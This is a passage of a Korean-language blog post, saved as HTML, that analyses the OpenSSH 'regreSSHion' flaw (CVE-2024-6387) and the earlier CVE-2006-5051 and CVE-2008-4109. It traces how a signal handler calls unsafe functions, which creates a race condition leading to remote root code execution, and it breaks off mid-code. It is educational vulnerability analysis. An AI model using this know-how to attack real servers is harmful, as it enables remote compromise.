<!DOCTYPE html> <html lang="en-US"> <head prefix="og: http://ogp.me/ns#"> <meta charset="UTF-8" /> <meta http-equiv="X-UA-Compatible" content="ie=edge" /> <meta name="viewport" content="width=device-width, initial-scale=1.0" /> <meta name="mobile-web-app-capable" content="yes" /> <meta name="apple-mobile-web-app-capable" content="yes" /> <meta name="application-name" content="41D3N" /> <meta name="apple-mobile-web-app-status-bar-style" content="#fff" /> <meta name="apple-mobile-web-app-title" content="41D3N" /> <title> CVE-2024-6387/CVE-2006-5051/CVE-2008-4109 - Analysis of Vulnerabilities in OpenSSH Server on a glibc-based Linux System - 41D3N </title> <link rel="alternate" href="http://localhost:4444/CVE-2024-6387/" hreflang="en-US" /> <link rel="canonical" href="http://localhost:4444/CVE-2024-6387/" /> <meta name="description" content="CVE-2024-6387" /> <meta name="referrer" content="no-referrer-when-downgrade" /> <meta property="fb:app_id" content="" /> <meta property="og:site_name" content="CVE-2024-6387/CVE-2006-5051/CVE-2008-4109 - Analysis of Vulnerabilities in OpenSSH Server on a glibc-based Linux System | Aiden" /> <meta property="og:title" content="CVE-2024-6387/CVE-2006-5051/CVE-2008-4109 - Analysis of Vulnerabilities in OpenSSH Server on a glibc-based Linux System | Aiden" /> <meta property="og:type" content="website" /> <meta property="og:url" content="http://localhost:4444/CVE-2024-6387/" /> <meta property="og:description" content="CVE-2024-6387" /> <meta property="og:image" content="http://localhost:4444/assets/img/Aiden.png" /> <meta property="og:image:width" content="640" /> <meta property="og:image:height" content="640" /> <meta name="twitter:card" content="summary" /> <meta name="twitter:title" content="CVE-2024-6387/CVE-2006-5051/CVE-2008-4109 - Analysis of Vulnerabilities in OpenSSH Server on a glibc-based Linux System | twitter_username" /> <meta name="twitter:url" content="http://localhost:4444/CVE-2024-6387/" /> <meta name="twitter:site" content="@twitter_username" /> <meta name="twitter:creator" content="@twitter_username" /> <meta name="twitter:description" content="CVE-2024-6387" /> <meta name="twitter:image" content="http://localhost:4444/assets/img/Aiden.png" /> <link type="application/atom+xml" rel="alternate" href="http://localhost:4444/feed.xml" title="41D3N" /> <link rel="apple-touch-icon" sizes="180x180" href="/assets/favicons/apple-touch-icon.png" /> <link rel="icon" type="image/png" sizes="32x32" href="/assets/favicons/favicon-32x32.png" /> <link rel="icon" type="image/png" sizes="16x16" href="/assets/favicons/favicon-16x16.png" /> <link rel="manifest" href="/assets/favicons/site.webmanifest" /> <link rel="mask-icon" href="/assets/favicons/safari-pinned-tab.svg" color="#5bbad5" /> <meta name="apple-mobile-web-app-title" content="Jekyll Klise" /> <meta name="application-name" content="Jekyll Klise" /> <meta name="msapplication-TileColor" content="#da532c" /> <meta name="theme-color" content="#2c2c2c" /> <link rel="stylesheet" href="/assets/css/style.css" /> <!-- for mathjax support --> </head> <body data-theme="dark" class="notransition"> <script> const body = document.body; const data = body.getAttribute("data-theme"); const initTheme = (state) => { if (state === "dark") { body.setAttribute("data-theme", "dark"); } else if (state === "light") { body.removeAttribute("data-theme"); } else { localStorage.setItem("theme", data); } }; initTheme(localStorage.getItem("theme")); setTimeout(() => body.classList.remove("notransition"), 75); </script> <div class="navbar" role="navigation"> <nav class="menu"> <input type="checkbox" id="menu-trigger" class="menu-trigger" /> <label for="menu-trigger"> <span class="menu-icon"> <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 512 512" > <path d="M64,384H448V341.33H64Zm0-106.67H448V234.67H64ZM64,128v42.67H448V128Z" /> </svg> </span> </label> <a id="mode"> <svg class="mode-sunny" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 512 512" > <title>LIGHT</title> <line x1="256" y1="48" x2="256" y2="96" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px" /> <line x1="256" y1="416" x2="256" y2="464" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px" /> <line x1="403.08" y1="108.92" x2="369.14" y2="142.86" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px" /> <line x1="142.86" y1="369.14" x2="108.92" y2="403.08" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px" /> <line x1="464" y1="256" x2="416" y2="256" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px" /> <line x1="96" y1="256" x2="48" y2="256" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px" /> <line x1="403.08" y1="403.08" x2="369.14" y2="369.14" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px" /> <line x1="142.86" y1="142.86" x2="108.92" y2="108.92" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px" /> <circle cx="256" cy="256" r="80" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px" /> </svg> <svg class="mode-moon" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 512 512" > <title>DARK</title> <line x1="256" y1="48" x2="256" y2="96" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px" /> <line x1="256" y1="416" x2="256" y2="464" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px" /> <line x1="403.08" y1="108.92" x2="369.14" y2="142.86" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px" /> <line x1="142.86" y1="369.14" x2="108.92" y2="403.08" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px" /> <line x1="464" y1="256" x2="416" y2="256" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px" /> <line x1="96" y1="256" x2="48" y2="256" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px" /> <line x1="403.08" y1="403.08" x2="369.14" y2="369.14" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px" /> <line x1="142.86" y1="142.86" x2="108.92" y2="108.92" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px" /> <circle cx="256" cy="256" r="80" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px" /> </svg> </a> <div class="trigger"> <div class="trigger-container"><a class="menu-link" href="/">home</a><a class="menu-link" href="/archive/">archive</a><a class="menu-link" href="/about/">about</a><a class="menu-link rss" href="/feed.xml"> <svg xmlns="http://www.w3.org/2000/svg" width="17" height="17" viewBox="0 0 512 512" fill="#ED812E" > <title>RSS</title> <path d="M108.56,342.78a60.34,60.34,0,1,0,60.56,60.44A60.63,60.63,0,0,0,108.56,342.78Z" /> <path d="M48,186.67v86.55c52,0,101.94,15.39,138.67,52.11s52,86.56,52,138.67h86.66C325.33,312.44,199.67,186.67,48,186.67Z" /> <path d="M48,48v86.56c185.25,0,329.22,144.08,329.22,329.44H464C464,234.66,277.67,48,48,48Z" /> </svg> </a> </div> </div> </nav> </div> <div class="wrapper post"> <main class="page-content" aria-label="Content"> <article itemscope itemtype="https://schema.org/BlogPosting"> <header class="header"> <div class="tags"> <span itemprop="keywords"> <a class="tag" href="/tags/#1-day">1-DAY</a>, <a class="tag" href="/tags/#exploit">EXPLOIT</a>, <a class="tag" href="/tags/#openssh">OPENSSH</a>, <a class="tag" href="/tags/#linux">LINUX</a> </span> </div> <h1 class="header-title" itemprop="headline">CVE-2024-6387/CVE-2006-5051/CVE-2008-4109 - Analysis of Vulnerabilities in OpenSSH Server on a glibc-based Linux System</h1> <div class="post-meta"> <time datetime="2024-10-15T09:00:00+09:00" itemprop="datePublished"> Oct 15, 2024 </time> <span itemprop="author" itemscope itemtype="https://schema.org/Person"> <span itemprop="name">Aiden</span> </span> <time hidden datetime="2024-11-05T09:00:00+09:00" itemprop="dateModified"> Oct 15, 2024 </time> <span hidden itemprop="publisher" itemtype="Person">Aiden</span> <span hidden itemprop="image"></span> <span hidden itemprop="mainEntityOfPage"><p align="center"><img src="/assets/img/CVE-2024-6387/openssh.gif" /></p> </span> </div> </header> <div class="page-content" itemprop="articleBody"> <p align="center"><img src="/assets/img/CVE-2024-6387/openssh.gif" /></p> <h1 id="intro"> <a href="#intro" class="anchor-head"></a> Intro </h1> <p>TOOR 팀 활동을 하며 분석하게된 OpenSSH 원데이 취약점에 관한 글입니다.</p> <p align="center"><img src="/assets/img/toor.png" /></p> <p><code class="language-plaintext highlighter-rouge">CVE-2024-6387</code>은 7월 1일에 공개된 <a href="https://en.wikipedia.org/wiki/Qualys">Qualys</a>에서 발견하고 <code class="language-plaintext highlighter-rouge">OpenSSH</code> 버전 <code class="language-plaintext highlighter-rouge">9.8/9.8p1</code>에서 패치된 취약점입니다. <code class="language-plaintext highlighter-rouge">CVE-2024-6387</code>은 <code class="language-plaintext highlighter-rouge">CVE-2006-5051</code>의 보안 회귀(Security Regression)로, 패치되었던 취약점이 잘못된 패치로 인해서 재발생한 케이스입니다. <code class="language-plaintext highlighter-rouge">CVE-2006-5051</code>의 보안 회귀 취약점이기 때문에 해당 취약점은 “RegreSSHion”이란 이름으로 불리고 있습니다.</p> <p>두 취약점 모두 <code class="language-plaintext highlighter-rouge">glibc</code>를 기반으로둔 리눅스 시스템 프로그램인 <code class="language-plaintext highlighter-rouge">OpenSSH</code>의 서버 프로그램에 존재하는 <code class="language-plaintext highlighter-rouge">SIGALRM</code> 시그널 핸들러에서 <code class="language-plaintext highlighter-rouge">Async-signal-unsafe</code> 함수를 사용하여 발생하게 되는 취약점입니다. 이로인해 레이스 컨디션이 발생할 수 있습니다. 결과적으론 해당 취약점으로 인해 root 권한으로 대상 서버에 대한 RCE가 가능해집니다.</p> <p>본 글은 선행 연구를 진행하신 다른 연구원분들의 글들을 읽고 제 나름 분석을 진행하며 취약점을 공부하며 이해하고 정리해본 결과로 작성하게된 글입니다. 나름의 분석을 해봤지만 맞지 않는 부분이 있을 수 있으며, 만약 이를 발견하셨을 시 피드백해주시면 적극 반영하도록 하겠습니다. 취약점 및 <code class="language-plaintext highlighter-rouge">PoC</code> 분석에 많은 도움이된 자료는 다음과 같습니다.</p> <ul> <li><a href="https://www.qualys.com/2024/07/01/cve-2024-6387/regresshion.txt">https://www.qualys.com/2024/07/01/cve-2024-6387/regresshion.txt</a></li> </ul> <h1 id="vuln"> <a href="#vuln" class="anchor-head"></a> Vuln </h1> <ul> <li>CVE-ID : CVE-2024-6387</li> <li>CWE : <a href="http://cwe.mitre.org/data/definitions/362.html">CWE-362</a>, <a href="http://cwe.mitre.org/data/definitions/364.html">CWE-364</a></li> <li>영향 받는 버전</li> </ul> <table> <tr> <th bgcolor="#00ff7f" style="color:black">취약하지 않은 버전</th> <th bgcolor="#fa8072" style="color:black">취약한 버전</th> </tr> </table> <table> <tr> <th> Release </th> <th> Status </th> <th> Date </th> </tr> <tr> <td bgcolor="#fa8072" style="color:black"> &lt; 4.4p1 </td> <td> CVE-2006-5051 또는 CVE-2008-4109에 대한 패치가 적용되지 않았을 경우 취약 </td> <td> 2006년 9월 27일 이전 </td> </tr> <tr> <td bgcolor="#00ff7f" style="color:black"> 4.4p1 ≤ OpenSSH &lt; 8.5p1 </td> <td> Mitigation 적용으로 취약하지 않음 </td> <td> 2006년 9월 27일 ~ 2021년 3월 3일 </td> </tr> <tr> <td bgcolor="#fa8072" style="color:black"> 8.5p1 ≤ OpenSSH &lt; 9.8p1 </td> <td> 취약점 재발 </td> <td> 2021년 3월 3일 ~ 2024년 7월 1일 </td> </tr> <tr> <td bgcolor="#00ff7f" style="color:black"> ≥ 9.8p1 </td> <td> 회귀에 대한 패치 적용 </td> <td> 2024년 7월 1일 이후 </td> </tr> </table> <p>Reference : <a href="https://en.wikipedia.org/wiki/RegreSSHion">https://en.wikipedia.org/wiki/RegreSSHion</a></p> <h1 id="rca"> <a href="#rca" class="anchor-head"></a> RCA </h1> <p><code class="language-plaintext highlighter-rouge">CVE-2024-6387</code>에 대해 알아보기 전 먼저 <code class="language-plaintext highlighter-rouge">CVE-2006-5051</code>에 대해서 알아보고 해당 취약점이 어떻게 재발생하게되었는지 알아봅시다.</p> <h2 id="cve-2006-5051"> <a href="#cve-2006-5051" class="anchor-head"></a> CVE-2006-5051 </h2> <p>OpenSSH의 코드 중 sshd.c에 존재하는 <a href="https://github.com/openssh/openssh-portable/blob/V_4_3/sshd.c#L307"><code class="language-plaintext highlighter-rouge">grace_alarm_handler</code></a>는 사용자가 로그인 요청을 하고나서 일정 시간이 지나도록 로그인을 하지 않으면 발생하는 <code class="language-plaintext highlighter-rouge">SIGALRM</code> 시그널을 처리하는 함수입니다.</p> <p><code class="language-plaintext highlighter-rouge">grace_alarm_handler</code>는 sshd의 <a href="https://github.com/openssh/openssh-portable/blob/V_4_3/sshd.c#L1685"><code class="language-plaintext highlighter-rouge">main</code> 함수에서 설정</a>되고 <code class="language-plaintext highlighter-rouge">sshd_config</code> 지시어(LoginGraceTime)로 설정된 일정 시간이 지나게되었을 때 발생하는 <code class="language-plaintext highlighter-rouge">SIGALRM</code> 시그널을 처리하기 위해 호출됩니다.</p> <p>다음과 같이 로그인 시도 후 <code class="language-plaintext highlighter-rouge">LoginGraceTime</code>이 설정되어있다면 인증 시간 초과(<code class="language-plaintext highlighter-rouge">SIGALRM</code>)에 의해 <code class="language-plaintext highlighter-rouge">grace_alarm_handler</code>가 호출됩니다.</p> <p>영상에 나온 OpenSSH 버전은 <code class="language-plaintext highlighter-rouge">9.2p</code>로 <code class="language-plaintext highlighter-rouge">grace_alarm_handler</code>의 작동을 보여드리기 위해 사용되었습니다.</p> <video width="100%" height="100%" controls=""> <source src="/assets/videos/CVE-2024-6387/sigalarm_grace.mkv" type="video/webm" /> </video> <p><code class="language-plaintext highlighter-rouge">OpenSSH 4.3</code> 버전의 <a href="https://github.com/openssh/openssh-portable/blob/V_4_3/sshd.c#L307"><code class="language-plaintext highlighter-rouge">grace_alarm_handler</code></a>는 다음과 같이 작성되어있습니다.</p> <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cm">/*
 * Signal handler for the alarm after the login grace period has expired.
 */</span>
<span class="k">static</span> <span class="kt">void</span>
<span class="nf">grace_alarm_handler</span><span class="p">(</span><span class="kt">int</span> <span class="n">sig</span><span class="p">)</span>
<span class="p">{</span>
	<span class="cm">/* XXX no idea how fix this signal handler */</span>

	<span class="k">if</span> <span class="p">(</span><span class="n">use_privsep</span> <span class="o">&amp;&amp;</span> <span class="n">pmonitor</span> <span class="o">!=</span> <span class="nb">NULL</span> <span class="o">&amp;&amp;</span> <span class="n">pmonitor</span><span class="o">-&gt;</span><span class="n">m_pid</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span>
		<span class="n">kill</span><span class="p">(</span><span class="n">pmonitor</span><span class="o">-&gt;</span><span class="n">m_pid</span><span class="p">,</span> <span class="n">SIGALRM</span><span class="p">);</span>

	<span class="cm">/* Log error and exit. */</span>
	<span class="n">fatal</span><span class="p">(</span><span class="s">"Timeout before authentication for %s"</span><span class="p">,</span> <span class="n">get_remote_ipaddr</span><span class="p">());</span>
<span class="p">}</span>
</code></pre></div></div> <p>로깅을 위해 <code class="language-plaintext highlighter-rouge">fatal</code> 함수를 호출하는 모습을 볼 수 있습니다. <code class="language-plaintext highlighter-rouge">fatal</code> 함수는 <a href="https://github.com/openssh/openssh-portable/blob/V_4_3/fatal.c">fatal.c</a>에 다음과 같이 작성되어있습니다.</p> <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">void</span>
<span class="nf">fatal</span><span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">fmt</span><span class="p">,...)</span>
<span class="p">{</span>
	<span class="kt">va_list</span> <span class="n">args</span><span class="p">;</span>
	<span class="n">va_start</span><span class="p">(</span><span class="n">args</span><span class="p">,</span> <span class="n">fmt</span><span class="p">);</span>
	<span class="n">do_log</span><span class="p">(</span><span class="n">SYSLOG_LEVEL_FATAL</span><span class="p">,</span> <span class="n">fmt</span><span class="p">,</span> <span class="n">args</span><span class="p">);</span>
	<span class="n">va_end</span><span class="p">(</span><span class="n">args</span><span class="p">);</span>
	<span class="n">cleanup_exit</span><span class="p">(</span><span class="mi">255</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div></div> <p><code class="language-plaintext highlighter-rouge">fatal</code> 함수는 다시 로깅을 위해 <code class="language-plaintext highlighter-rouge">log.c</code>에 위치한 <a href="https://github.com/openssh/openssh-portable/blob/V_4_3/log.c#L286"><code class="language-plaintext highlighter-rouge">do_log</code></a> 함수를 호출합니다. 이제 <code class="language-plaintext highlighter-rouge">do_log</code> 코드를 확인해봅시다.</p> <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">void</span>
<span class="nf">do_log</span><span class="p">(</span><span class="n">LogLevel</span> <span class="n">level</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">fmt</span><span class="p">,</span> <span class="kt">va_list</span> <span class="n">args</span><span class="p">)</span>
<span class="p">{</span>
<span class="p">...</span>
		<span class="n">syslog</span><span class="p">(</span><span class="n">pri</span><span class="p">,</span> <span class="s">"%.500s"</span><span class="p">,</span> <span class="n">fmtbuf</span><span class="p">);</span>
<span class="p">...</span>
	<span class="p">}</span>
<span class="err">}</span>
</code></pre></div></div> <p>해당 코드에서 <code class="language-plaintext highlighter-rouge">syslog</code>를 호출하는 모습을 볼 수 있습니다. 이때 <code class="language-plaintext highlighter-rouge">glibc</code>의 <code class="language-plaintext highlighter-rouge">syslog</code>는 메모리 버퍼 스트림을 생성하기 위해서 <code class="language-plaintext highlighter-rouge">malloc</code>을 호출하고 함수의 끝에서는 해당 메모리를 정리하기 위해서 <code class="language-plaintext highlighter-rouge">free</code>함수를 호출합니다. 이때의 <a href="https://stackoverflow.com/questions/3941271/why-are-malloc-and-printf-said-as-non-reentrant"><code class="language-plaintext highlighter-rouge">malloc</code></a>과 <code class="language-plaintext highlighter-rouge">free</code>는 비동기 시그널에 안전하지 않기 때문에 시그널 처리 함수에서는 호출되어선 안되지만 <code class="language-plaintext highlighter-rouge">syslog</code>의 호출로 인해서 취약점이 발생한 상황입니다.</p> <h2 id="async-signal-safe-function"> <a href="#async-signal-safe-function" class="anchor-head"></a> Async-signal-safe function </h2> <p><code class="language-plaintext highlighter-rouge">Async-signal-safe</code> 함수란 시그널 핸들러 내에서 안전하게 호출할 수 있는 함수를 뜻합니다.</p> <p>시그널 핸들러에서 호출하는 함수가 <code class="language-plaintext highlighter-rouge">async signal safety</code>(비동기 시그널 안전성)이 없을 경우 취약점이 발생할 수 있습니다.</p> <ul> <li><a href="https://stackoverflow.com/questions/3941271/why-are-malloc-and-printf-said-as-non-reentrant">https://stackoverflow.com/questions/3941271/why-are-malloc-and-printf-said-as-non-reentrant</a></li> </ul> <p><code class="language-plaintext highlighter-rouge">CVE-2006-5051</code>은 <code class="language-plaintext highlighter-rouge">async-signal-unsafe</code> 함수를 호출해서 발생합니다. 바로 직접적인 호출은 아니며 위에서 살펴본대로 다음과 같은 과정으로 <code class="language-plaintext highlighter-rouge">async-signal-unsafe</code> 함수가 호출됩니다.</p> <p align="center"><img src="/assets/img/CVE-2024-6387/function_call_diagram.png" /></p> <p>이와 같은 <code class="language-plaintext highlighter-rouge">SIGALRM</code> 핸들러의 허점을 이용해 <code class="language-plaintext highlighter-rouge">malloc/free</code> 함수 처리 중 특정 지점에서의 처리를 중단시키고 <code class="language-plaintext highlighter-rouge">malloc/free</code>에 재진입하여 익스플로잇을 성공시킵니다.</p> <h2 id="cve-2006-5051-patch-incorrect-fix"> <a href="#cve-2006-5051-patch-incorrect-fix" class="anchor-head"></a> CVE-2006-5051 Patch (Incorrect fix) </h2> <p>위에서 알아본 취약점은 <code class="language-plaintext highlighter-rouge">CVE-2006-5051</code> 패치에 의해 다음과 같이 수정되었습니다.</p> <p><code class="language-plaintext highlighter-rouge">OpenSSH 4.4</code> 버전의 코드는 다음과 같습니다.</p> <p>먼저 sshd.c에서의 <code class="language-plaintext highlighter-rouge">grace_alarm_handler</code>는 다음과 같이 변경되었습니다.</p> <p>4.3p2</p> <p align="center"><img width="100%" src="/assets/img/CVE-2024-6387/grace_alarm_handler_4.3p2.png" /></p> <p>4.4</p> <p align="center"><img width="100%" src="/assets/img/CVE-2024-6387/grace_alarm_handler_4.4.png" /></p> <p>4.4에선 <code class="language-plaintext highlighter-rouge">sigdie</code>를 호출하는 형태로 바뀌었습니다. <code class="language-plaintext highlighter-rouge">sigdie</code>는 이전 버전과 동일하게 <code class="language-plaintext highlighter-rouge">do_log</code>를 호출합니다.</p> <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">void</span>
<span class="nf">sigdie</span><span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">fmt</span><span class="p">,...)</span>
<span class="p">{</span>
	<span class="kt">va_list</span> <span class="n">args</span><span class="p">;</span>

	<span class="n">va_start</span><span class="p">(</span><span class="n">args</span><span class="p">,</span> <span class="n">fmt</span><span class="p">);</span>
	<span class="n">do_log</span><span class="p">(</span><span class="n">SYSLOG_LEVEL_FATAL</span><span class="p">,</span> <span class="n">fmt</span><span class="p">,</span> <span class="n">args</span><span class="p">);</span>
	<span class="n">va_end</span><span class="p">(</span><span class="n">args</span><span class="p">);</span>
	<span class="n">_exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div></div> <p>하지만 <code class="language-plaintext highlighter-rouge">do_log</code>에서 여전히 <code class="language-plaintext highlighter-rouge">syslog</code>를 호출하는 모습이 보입니다.</p> <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">...</span>

<span class="kt">void</span>
<span class="nf">do_log</span><span class="p">(</span><span class="n">LogLevel</span> <span class="n">level</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">fmt</span><span class="p">,</span> <span class="kt">va_list</span> <span class="n">args</span><span class="p">)</span>
<span class="p">{</span>
<span class="p">...</span>
		<span class="n">syslog</span><span class="p">(</span><span class="n">pri</span><span class="p">,</span> <span class="s">"%.500s"</span><span class="p">,</span> <span class="n">fmtbuf</span><span class="p">);</span>
<span class="p">...</span>
<span class="p">}</span>
</code></pre></div></div> <p>잘못된 패치가 이루어졌고 해당 취약점은 여전히 존재하는 상태가 됩니다.</p> <h2 id="cve-2008-4109-patch"> <a href="#cve-2008-4109-patch" class="anchor-head"></a> CVE-2008-4109 Patch </h2> <p>앞서 알아본 취약점은 <a href="https://nvd.nist.gov/vuln/detail/CVE-2008-4109"><code class="language-plaintext highlighter-rouge">CVE-2008-4109</code></a> 패치에서 비로소 수정됩니다.</p> <blockquote> <p>A certain Debian patch for OpenSSH before 4.3p2-9etch3 on etch; before 4.6p1-1 on sid and lenny; and on other distributions such as SUSE uses functions that are not async-signal-safe in the signal handler for login timeouts, which allows remote attackers to cause a denial of service (connection slot exhaustion) via multiple login attempts. NOTE: this issue exists because of an incorrect fix for CVE-2006-5051.</p> </blockquote> <p>OpenSSH 4.5p1 <code class="language-plaintext highlighter-rouge">grace_alarm_handler</code></p> <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cm">/*
 * Signal handler for the alarm after the login grace period has expired.
 */</span>
<span class="cm">/*ARGSUSED*/</span>
<span class="k">static</span> <span class="kt">void</span>
<span class="nf">grace_alarm_handler</span><span class="p">(</span><span class="kt">int</span> <span class="n">sig</span><span class="p">)</span>
<span class="p">{</span>
	<span class="k">if</span> <span class="p">(</span><span class="n">use_privsep</span> <span class="o">&amp;&amp;</span> <span class="n">pmonitor</span> <span class="o">!=</span> <span class="nb">NULL</span> <span class="o">&amp;&amp;</span> <span class="n">pmonitor</span><span class="o">-&gt;</span><span class="n">m_pid</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span>
		<span class="n">kill</span><span class="p">(</span><span class="n">pmonitor</span><span class="o">-&gt;</span><span class="n">m_pid</span><span class="p">,</span> <span class="n">SIGALRM</span><span class="p">);</span>

	<span class="cm">/* Log error and exit. */</span>
	<span class="n">sigdie</span><span class="p">(</span><span class="s">"Timeout before authentication for %s"</span><span class="p">,</span> <span class="n">get_remote_ipaddr</span><span class="p">());</span>
<span class="p">}</span>
</code></pre></div></div> <p>OpenSSH 4.5p1 <code class="language-plaintext highlighter-rouge">sigdie</code></p> <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">void</span>
<span class="nf">sigdie</span><span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">fmt</span><span class="p">,...)</span>
<span class="p">{</span>
<span class="cp">#ifdef DO_LOG_SAFE_IN_SIGHAND
</span>	<span class="kt">va_list</span> <span class="n">args</span><span class="p">;</span>

	<span class="n">va_start</span><span class="p">(</span><span class="n">args</span><span class="p">,</span> <span class="n">fmt</span><span class="p">);</span>
	<span class="n">do_log</span><span class="p">(</span><span class="n">SYSLOG_LEVEL_FATAL</span><span class="p">,</span> <span class="n">fmt</span><span class="p">,</span> <span class="n">args</span><span class="p">);</span>
	<span class="n">va_end</span><span class="p">(</span><span class="n">args</span><span class="p">);</span>
<span class="cp">#endif
</span>	<span class="n">_exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div></div> <p><code class="language-plaintext highlighter-rouge">grace_alarm_handler</code>에서 호출되는 <code class="language-plaintext highlighter-rouge">sigdie</code>에는 전처리 코드가 삽입되어 <code class="language-plaintext highlighter-rouge">DO_LOG_SAFE_IN_SIGHAND</code>를 정의하지 않는이상 <code class="language-plaintext highlighter-rouge">do_log</code>를 호출하는 일은 없어졌습니다.</p> <h2 id="cve-2024-6387-regresshion"> <a href="#cve-2024-6387-regresshion" class="anchor-head"></a> CVE-2024-6387 (RegreSSHion) </h2> <p>앞서 살펴본 취약점인 <code class="language-plaintext highlighter-rouge">CVE-2006-5051</code>과 <code class="language-plaintext highlighter-rouge">CVE-2008-4109</code>는 위에서 적용된 <code class="language-plaintext highlighter-rouge">#ifdef DO_LOG_SAFE_IN_SIGHAND</code>가 실수로 제거되어 <a href="https://github.com/openssh/openssh-portable/commit/752250c"><code class="language-plaintext highlighter-rouge">commit 752250c</code></a>(OpenSSH 8.5p1)에 의해서 부활하게됩니다.</p> <p>코드가 어떻게 바뀌었는지 확인해봅시다.</p> <p>grace_alarm_handler</p> <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cm">/*
 * Signal handler for the alarm after the login grace period has expired.
 */</span>
<span class="cm">/*ARGSUSED*/</span>
<span class="k">static</span> <span class="kt">void</span>
<span class="nf">grace_alarm_handler</span><span class="p">(</span><span class="kt">int</span> <span class="n">sig</span><span class="p">)</span>
<span class="p">{</span>
	<span class="k">if</span> <span class="p">(</span><span class="n">use_privsep</span> <span class="o">&amp;&amp;</span> <span class="n">pmonitor</span> <span class="o">!=</span> <span class="nb">NULL</span> <span class="o">&amp;&amp;</span> <span class="n">pmonitor</span><span class="o">-&gt;</span><span class="n">m_pid</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span>
		<span class="n">kill</span><span class="p">(</span><span class="n">pmonitor</span><span class="o">-&gt;</span><span class="n">m_pid</span><span class="p">,</span> <span class="n">SIGALRM</span><span class="p">);</span>

	<span class="cm">/*
	 * Try to kill any processes that we have spawned, E.g. authorized
	 * keys command helpers.
	 */</span>
	<span class="k">if</span> <span class="p">(</span><span class="n">getpgid</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">==</span> <span class="n">getpid</span><span class="p">())</span> <span class="p">{</span>
		<span class="n">ssh_signal</span><span class="p">(</span><span class="n">SIGTERM</span><span class="p">,</span> <span class="n">SIG_IGN</span><span class="p">);</span>
		<span class="n">kill</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">SIGTERM</span><span class="p">);</span>
	<span class="p">}</span>

	<span class="cm">/* XXX pre-format ipaddr/port so we don't need to access active_state */</span>
	<span class="cm">/* Log error and exit. */</span>
	<span class="n">sigdie</span><span class="p">(</span><span class="s">"Timeout before authentication for %s port %d"</span><span class="p">,</span>
	    <span class="n">ssh_remote_ipaddr</span><span class="p">(</span><span class="n">the_active_state</span><span class="p">),</span>
	    <span class="n">ssh_remote_port</span><span class="p">(</span><span class="n">the_active_state</span><span class="p">));</span>
<span class="p">}</span>
</code></pre></div></div> <p>여기서 <code class="language-plaintext highlighter-rouge">sigdie</code>는 매크로로 <code class="language-plaintext highlighter-rouge">sshsigdie</code>로 확장됩니다.</p> <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#define sigdie(...)		sshsigdie(__FILE__, __func__, __LINE__, 0, SYSLOG_LEVEL_ERROR, NULL, __VA_ARGS__)
</span></code></pre></div></div> <p><code class="language-plaintext highlighter-rouge">sshsigdie</code>는 다음과 같이 정의되어있습니다. 이때 <code class="language-plaintext highlighter-rouge">sshsigdie</code>는 <code class="language-plaintext highlighter-rouge">sshlogv</code>를 호출합니다.</p> <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">void</span>
<span class="nf">sshsigdie</span><span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">file</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">func</span><span class="p">,</span> <span class="kt">int</span> <span class="n">line</span><span class="p">,</span> <span class="kt">int</span> <span class="n">showfunc</span><span class="p">,</span>
    <span class="n">LogLevel</span> <span class="n">level</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">suffix</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">fmt</span><span class="p">,</span> <span class="p">...)</span>
<span class="p">{</span>
	<span class="kt">va_list</span> <span class="n">args</span><span class="p">;</span>

